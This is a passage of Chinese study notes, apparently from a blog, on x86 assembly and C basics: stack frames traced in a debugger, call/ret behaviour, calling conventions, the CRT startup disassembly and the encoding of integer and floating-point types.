移动方向由D标志位决定 </span><br><span class=\"line\">D = 0 + </span><br><span class=\"line\">D = 1 -</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219215520140.png\" alt=\"image-20221219215520140\"></p>\n<h2 id=\"jcc-2\"><a class=\"markdownIt-Anchor\" href=\"#jcc-2\">#</a> JCC</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228171843970.png\" alt=\"image-20221228171843970\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228184206472.png\" alt=\"image-20221228184206472\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228184559423.png\" alt=\"image-20221228184559423\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228184754864.png\" alt=\"image-20221228184754864\"></p>\n<p>test  可以判断寄存器中值是否为 0</p>\n<p><strong>call 执行时首先将 call 的下一条命令入栈，通过当前地址 + 当前指令长度，指令长度通过硬编码确定，此时 esp-4，作为 call ret 之后的下一条执行，EIP 变为 call 的地址</strong></p>\n<p><strong>ret 时将栈顶的返回地址给 EIP，esp+4</strong></p>\n<p><strong>因此一个函数在被调用时，堆栈栈顶就是他返回后执行的下一条指令</strong></p>\n<h2 id=\"堆栈图\"><a class=\"markdownIt-Anchor\" href=\"#堆栈图\">#</a> 堆栈图</h2>\n<p>定位到 winMain</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230210156563.png\" alt=\"image-20221230210156563\"></p>\n<p>有如下函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401085  |.  6A 04         push    0x4</span><br><span class=\"line\">00401087  |.  6A 03         push    0x3</span><br><span class=\"line\">00401089  |.  E8 77FFFFFF   call    00401005</span><br><span class=\"line\">0040108E  |.  83C4 08       add     esp,0x8</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401005   $ /E9 16000000   jmp     add</span><br><span class=\"line\">0040100A   $ |E9 51000000   jmp     main</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401020 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br><span class=\"line\">00401029  |.  8D7D B8       lea     edi,[local.18]</span><br><span class=\"line\">0040102C  |.  B9 12000000   mov     ecx,0x12</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  8B45 08       mov     eax,[arg.1]</span><br><span class=\"line\">0040103B  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">0040103E  |.  8B4D 0C       mov     ecx,[arg.2]</span><br><span class=\"line\">00401041  |.  894D F8       mov     [local.2],ecx</span><br><span class=\"line\">00401044  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">00401047  |.  0345 F8       add     eax,[local.2]</span><br><span class=\"line\">0040104A  |.  5F            pop     edi</span><br><span class=\"line\">0040104B  |.  5E            pop     esi</span><br><span class=\"line\">0040104C  |.  5B            pop     ebx</span><br><span class=\"line\">0040104D  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040104F  |.  5D            pop     ebp</span><br><span class=\"line\">00401050  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230235920026.png\" alt=\"image-20221230235920026\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230235929733.png\" alt=\"image-20221230235929733\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230235938501.png\" alt=\"image-20221230235938501\"></p>\n<blockquote>\n<p>注意 1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0018FE94     00000001</span><br><span class=\"line\">0018FE98     0018FF48</span><br><span class=\"line\">0018FE9C     00000000</span><br><span class=\"line\">0018FEA0     7EFDE000</span><br><span class=\"line\">0018FEA4     CCCCCCCC</span><br><span class=\"line\">0018FEA8     CCCCCCCC</span><br><span class=\"line\">0018FEAC     CCCCCCCC</span><br><span class=\"line\">0018FEB0     CCCCCCCC</span><br><span class=\"line\">0018FEB4     CCCCCCCC</span><br><span class=\"line\">0018FEB8     CCCCCCCC</span><br><span class=\"line\">0018FEBC     CCCCCCCC</span><br><span class=\"line\">0018FEC0     CCCCCCCC</span><br><span class=\"line\">0018FEC4     CCCCCCCC</span><br><span class=\"line\">0018FEC8     CCCCCCCC</span><br><span class=\"line\">0018FECC     CCCCCCCC</span><br><span class=\"line\">0018FED0     CCCCCCCC</span><br><span class=\"line\">0018FED4     CCCCCCCC</span><br><span class=\"line\">0018FED8     CCCCCCCC</span><br><span class=\"line\">0018FEDC     CCCCCCCC</span><br><span class=\"line\">0018FEE0     CCCCCCCC</span><br><span class=\"line\">0018FEE4     00000004</span><br><span class=\"line\">0018FEE8     00000003</span><br><span class=\"line\">0018FEEC     0018FF48</span><br><span class=\"line\">0018FEF0     0040108E  add.0040108E</span><br><span class=\"line\">0018FEF4     00000003</span><br><span class=\"line\">0018FEF8     00000004</span><br><span class=\"line\">0018FEFC     00000000</span><br></pre></td></tr></table></figure>\n<p>这是 add esp, 0x8 之后的堆栈，并不是将他清空了，只是改变了 esp，垃圾数据还在那</p>\n<p>注意 2：</p>\n<p>CCCCCCCC 是 int3 的硬编码</p>\n<p>注意 3：</p>\n<p>esp+8 是外部传进来的参数</p>\n<p>esp-4 是函数内部的局部变量</p>\n<p>esp+4 是函数返回的地址</p>\n<p>注意 4：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint c = a;</span><br><span class=\"line\">\tint d = b;</span><br><span class=\"line\">\treturn c + d;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;Hello World!\\n&quot;);</span><br><span class=\"line\">\tadd(3,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//这是函数代码</span><br></pre></td></tr></table></figure>\n<p>注意 5：</p>\n<p>add esp,0x8 是 cdecl 的外平栈</p>\n<p>ret 8 是 stdcall 的内平栈</p>\n<p>注意 6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea     edi,dword ptr ss:[ebp-0x48]</span><br><span class=\"line\">mov     ecx,0x12</span><br><span class=\"line\">mov     eax,0xCCCCCCCC</span><br><span class=\"line\">rep     stos dword ptr es:[edi]</span><br></pre></td></tr></table></figure>\n<p>的作用是重复 12 次，将 CCCCCCCC 的值不停填充到 ebp-48 的位置，每填充一次 edi+4，edi+4 或 - 4 由 df 标志位决定，df=0 +  df=1 -</p>\n</blockquote>\n<h2 id=\"函数\"><a class=\"markdownIt-Anchor\" href=\"#函数\">#</a> 函数</h2>\n<p>计算机的函数，是一个固定的一个程序段，或称其为一个子程序，它东可以实现固定运算功能的同时还带有一入口和一个出口，所谓的入口，就是函数所带的各个参数，我们可以通过这个入口，把函数的参数值代入子程序，供计算机处理，所谓出口，就是指函数的计算结果，也称为返回值，在计算机求得之后，由此口带回给调用它的程序。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101174907969.png\" alt=\"image-20230101174907969\"></p>\n<p>函数传参包括寄存器传参 (比如 this 指针) 和内存传参</p>\n<p>函数返回结果可以通过寄存器返回 (一般为 EAX) 或者内存</p>\n<p>Windows 堆栈特点</p>\n<p>1. 现进后出</p>\n<p>2. 向低地址扩展</p>\n<p>windows 中的堆栈，是一块普通的内存，主要用来存储一些临时的数据和参数等可以把 Windows 中的堆栈想象成是一个公用的书箱，函数就像是使用箱子的人函数在执行的时候，会用到这个书箱，把一些数据存到里面，但用完的时候一定要记得把书拿走，否则会乱的，也就是说，你放进去几本书，走的时候也要拿走几本书，这个就是堆栈平衡.</p>\n<h2 id=\"c语言\"><a class=\"markdownIt-Anchor\" href=\"#c语言\">#</a> C 语言</h2>\n<h3 id=\"vc60\"><a class=\"markdownIt-Anchor\" href=\"#vc60\">#</a> VC6.0</h3>\n<p><strong>快捷键</strong></p>\n<p>F7 编译</p>\n<p>F5 执行</p>\n<p>shift + F5 结束</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103212249828.png\" alt=\"image-20230103212249828\"></p>\n<p>函数名、参数名、变量名的命名规则：只能包含字母、数字和_且不能以数字开头.</p>\n<p><strong>函数返回值</strong></p>\n<p>1. 无参数，无返回值的格式形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void fun()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>当函数没有参数时不需要提升和降低堆栈</strong></p>\n<p>2. 有参数，无返回值函数格式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void fn(int a,double b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>裸函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) func1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> __declspec(naked) func1(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">调用裸函数中没有代码，没有ret,不能正常返回，会报错</span><br><span class=\"line\">需要手动加内联汇编中ret返回 </span><br></pre></td></tr></table></figure>\n<p>调用约定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__cdecl\t\t\t从右至左入栈\t\t\t\t\t\t\t调用者清理栈\t\t\t\t\t默认调用约定</span><br><span class=\"line\">__stdcall\t\t从右至左入栈\t\t\t\t\t\t\t自身清理堆栈\t\t\t\t\twinapi调用方式</span><br><span class=\"line\">__fastcall\t\tecx/edx传送前两个，从右至左入栈\t\t\t自身清理堆栈，如果参数大于两个，小于两个不用清理</span><br></pre></td></tr></table></figure>\n<p>函数入口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main(int 1, char * * 0x005210d8) line 23</span><br><span class=\"line\">mainCRTStartup() line 206 + 25 bytes</span><br><span class=\"line\">KERNEL32! 74d433ca()</span><br><span class=\"line\">NTDLL! 76f59ed2()</span><br><span class=\"line\">NTDLL! 76f59ea5()</span><br></pre></td></tr></table></figure>\n<p>更改入口点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230104194840789.png\" alt=\"image-20230104194840789\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main 函数被调用前要先调用的函数如下:</span><br><span class=\"line\">GetVersion()</span><br><span class=\"line\">_heap_init()</span><br><span class=\"line\">GetCommandLineA()</span><br><span class=\"line\">_crtGetEnvironmentStringsA()</span><br><span class=\"line\">_setargv(</span><br><span class=\"line\">_setenvp()</span><br><span class=\"line\">_cinit()</span><br><span class=\"line\"></span><br><span class=\"line\">以上函数都会在mainCRTStartup中初始化</span><br><span class=\"line\"></span><br><span class=\"line\">mainret = main(__argc,__argv,__environ);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401180 &gt;/$  55            push    ebp</span><br><span class=\"line\">00401181  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401183  |.  6A FF         push    -0x1</span><br><span class=\"line\">00401185  |.  68 38214200   push    00422138</span><br><span class=\"line\">0040118A  |.  68 30424000   push    _except_handler3                 ;  SE 处理程序安装</span><br><span class=\"line\">0040118F  |.  64:A1 0000000&gt;mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00401195  |.  50            push    eax</span><br><span class=\"line\">00401196  |.  64:8925 00000&gt;mov     dword ptr fs:[0],esp</span><br><span class=\"line\">0040119D  |.  83C4 F0       add     esp,-0x10</span><br><span class=\"line\">004011A0  |.  53            push    ebx</span><br><span class=\"line\">004011A1  |.  56            push    esi</span><br><span class=\"line\">004011A2  |.  57            push    edi</span><br><span class=\"line\">004011A3  |.  8965 E8       mov     [local.6],esp</span><br><span class=\"line\">004011A6  |.  FF15 4CA14200 call    dword ptr ds:[&lt;&amp;KERNEL32.GetVers&gt;;  kernel32.GetVersion</span><br><span class=\"line\">004011AC  |.  A3 707C4200   mov     dword ptr ds:[_osver],eax</span><br><span class=\"line\">004011B1  |.  A1 707C4200   mov     eax,dword ptr ds:[_osver]</span><br><span class=\"line\">004011B6  |.  C1E8 08       shr     eax,0x8</span><br><span class=\"line\">004011B9  |.  25 FF000000   and     eax,0xFF</span><br><span class=\"line\">004011BE  |.  A3 7C7C4200   mov     dword ptr ds:[_winminor],eax</span><br><span class=\"line\">004011C3  |.  8B0D 707C4200 mov     ecx,dword ptr ds:[_osver]</span><br><span class=\"line\">004011C9  |.  81E1 FF000000 and     ecx,0xFF</span><br><span class=\"line\">004011CF  |.  890D 787C4200 mov     dword ptr ds:[_winmajor],ecx</span><br><span class=\"line\">004011D5  |.  8B15 787C4200 mov     edx,dword ptr ds:[_winmajor]</span><br><span class=\"line\">004011DB  |.  C1E2 08       shl     edx,0x8</span><br><span class=\"line\">004011DE  |.  0315 7C7C4200 add     edx,dword ptr ds:[_winminor]</span><br><span class=\"line\">004011E4  |.  8915 747C4200 mov     dword ptr ds:[_winver],edx</span><br><span class=\"line\">004011EA  |.  A1 707C4200   mov     eax,dword ptr ds:[_osver]</span><br><span class=\"line\">004011EF  |.  C1E8 10       shr     eax,0x10</span><br><span class=\"line\">004011F2  |.  25 FFFF0000   and     eax,0xFFFF</span><br><span class=\"line\">004011F7  |.  A3 707C4200   mov     dword ptr ds:[_osver],eax</span><br><span class=\"line\">004011FC  |.  6A 00         push    0x0</span><br><span class=\"line\">004011FE  |.  E8 BD2D0000   call    _heap_init</span><br><span class=\"line\">00401203  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00401206  |.  85C0          test    eax,eax</span><br><span class=\"line\">00401208  |.  75 0A         jnz     short 00401214</span><br><span class=\"line\">0040120A  |.  6A 1C         push    0x1C</span><br><span class=\"line\">0040120C  |.  E8 CF000000   call    fast_error_exit</span><br><span class=\"line\">00401211  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00401214  |&gt;  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">0040121B  |.  E8 A0270000   call    _ioinit</span><br><span class=\"line\">00401220  |.  FF15 48A14200 call    dword ptr ds:[&lt;&amp;KERNEL32.GetComm&gt;; [GetCommandLineA</span><br><span class=\"line\">00401226  |.  A3 04964200   mov     dword ptr ds:[_acmdln],eax</span><br><span class=\"line\">0040122B  |.  E8 70250000   call    __crtGetEnvironmentStringsA</span><br><span class=\"line\">00401230  |.  A3 487C4200   mov     dword ptr ds:[_aenvptr],eax</span><br><span class=\"line\">00401235  |.  E8 56200000   call    _setargv</span><br><span class=\"line\">0040123A  |.  E8 011F0000   call    _setenvp</span><br><span class=\"line\">0040123F  |.  E8 1C1B0000   call    _cinit</span><br><span class=\"line\">00401244  |.  8B0D 8C7C4200 mov     ecx,dword ptr ds:[_environ]</span><br><span class=\"line\">0040124A  |.  890D 907C4200 mov     dword ptr ds:[__initenv],ecx</span><br><span class=\"line\">00401250  |.  8B15 8C7C4200 mov     edx,dword ptr ds:[_environ]</span><br><span class=\"line\">00401256  |.  52            push    edx</span><br><span class=\"line\">00401257  |.  A1 847C4200   mov     eax,dword ptr ds:[__argv]</span><br><span class=\"line\">0040125C  |.  50            push    eax</span><br><span class=\"line\">0040125D  |.  8B0D 807C4200 mov     ecx,dword ptr ds:[__argc]</span><br><span class=\"line\">00401263  |.  51            push    ecx</span><br><span class=\"line\">00401264  |.  E8 A1FDFFFF   call    0040100A</span><br><span class=\"line\">00401269  |.  83C4 0C       add     esp,0xC</span><br><span class=\"line\">0040126C  |.  8945 E4       mov     [local.7],eax</span><br><span class=\"line\">0040126F  |.  8B55 E4       mov     edx,[local.7]</span><br><span class=\"line\">00401272  |.  52            push    edx                              ; /status</span><br><span class=\"line\">00401273  |.  E8 281B0000   call    exit                             ; \\exit</span><br><span class=\"line\">00401278  |.  8B45 EC       mov     eax,[local.5]</span><br><span class=\"line\">0040127B  |.  8B08          mov     ecx,dword ptr ds:[eax]</span><br><span class=\"line\">0040127D  |.  8B11          mov     edx,dword ptr ds:[ecx]</span><br><span class=\"line\">0040127F  |.  8955 E0       mov     [local.8],edx</span><br><span class=\"line\">00401282  |.  8B45 EC       mov     eax,[local.5]</span><br><span class=\"line\">00401285  |.  50            push    eax</span><br><span class=\"line\">00401286  |.  8B4D E0       mov     ecx,[local.8]</span><br><span class=\"line\">00401289  |.  51            push    ecx</span><br><span class=\"line\">0040128A  |.  E8 A11C0000   call    _XcptFilter</span><br><span class=\"line\">0040128F  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00401292  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<h3 id=\"数据类型\"><a class=\"markdownIt-Anchor\" href=\"#数据类型\">#</a> 数据类型</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">基本类型：   \t  整数类型</span><br><span class=\"line\">\t\t\t     浮点类型</span><br><span class=\"line\">整数类型： <span class=\"type\">char</span> <span class=\"type\">short</span> <span class=\"title function_\">int</span><span class=\"params\">(<span class=\"number\">32</span>)</span> <span class=\"title function_\">long</span><span class=\"params\">(<span class=\"number\">32</span>)</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> i = <span class=\"number\">0x12345678</span>;</span><br><span class=\"line\">mov byte ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">78</span>h</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">short</span> k = <span class=\"number\">0x12345678</span>      k = <span class=\"number\">5678</span></span><br><span class=\"line\"></span><br><span class=\"line\">整数类型 <span class=\"type\">unsigned</span> <span class=\"type\">signed</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span>  a = <span class=\"number\">0xFF</span>;    <span class=\"comment\">//不写char默认int</span></span><br><span class=\"line\"><span class=\"type\">char</span> b = <span class=\"number\">0xFF</span>;</span><br><span class=\"line\">在内存中都是FF，但使用时有符号<span class=\"number\">-1</span>，无符号<span class=\"number\">255</span></span><br><span class=\"line\">类型转化，比较大小</span><br><span class=\"line\">    </span><br><span class=\"line\">编译器对于有符号和无符号的jcc编译结果不一样</span><br><span class=\"line\">jz je</span><br><span class=\"line\">    </span><br><span class=\"line\">浮点类型 <span class=\"type\">float</span> <span class=\"type\">double</span></span><br><span class=\"line\"><span class=\"type\">float</span> 存储方式 </span><br><span class=\"line\">符号位      指数部分\t\t\t尾数部分</span><br><span class=\"line\"><span class=\"number\">31</span><span class=\"number\">-30</span>      <span class=\"number\">30</span><span class=\"number\">-22</span>            <span class=\"number\">22</span><span class=\"number\">-0</span></span><br><span class=\"line\"><span class=\"type\">double</span> 存储方式 </span><br><span class=\"line\">符号位      指数部分\t\t\t尾数部分</span><br><span class=\"line\"><span class=\"number\">63</span><span class=\"number\">-62</span>      <span class=\"number\">62</span><span class=\"number\">-51</span>            <span class=\"number\">51</span><span class=\"number\">-0</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>将一个 float 型转化为内存存储格式的步骤为:</p>\n<p>1、先将这个实数的绝对值化为二进制格式<br>\n 2、将这个二进制格式实数的小数点左移或右移 n 位，直到小数点移动到第一个有效数字的右边。</p>\n<p>3、从小数点右边第一位开始数出二十三位数字放入第 22 到第 0 位。</p>\n<p>4、如果实数是正的，则在第 31 位放入 “0”，否则放入 “1”。</p>\n<p>5、如果 n 是左移得到的，说明指数是正的，第 30 位放入 “1”。如果 n 是右移得到的或 n=0，则第 30 位放入 0</p>\n<p>6、如果 n 是左移得到的，则将 n 减去 1 后化为二进制，并在左边加 “0” 补足七位，放入第 29 到第 23 位。</p>\n<p>如果 n 是右移得到的或 n=0，则将 n 化为二进制后在左边加 “0” 补足七位，再各位求反，再放入第 29 到第 23 位</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8.25</span><br><span class=\"line\">1.转为二进制数,整数部分除二取余,倒序排列,整数部分乘二取整,正序排列</span><br><span class=\"line\">\t1000.01</span><br><span class=\"line\">2.科学计数法,左移+右移-</span><br><span class=\"line\">\t1.00001*(2^3)</span><br><span class=\"line\">3.存放尾数,加起来一共23位，不够用0补，补在最后</span><br><span class=\"line\">\t00001000000000000000000</span><br><span class=\"line\">4.符号位正0负1</span><br><span class=\"line\">\t0</span><br><span class=\"line\">5.指数部分,第一位为位移方向，左移1，右移0.剩下七位是指数二进制-1的值    (或者使用127+x转为二进制填充 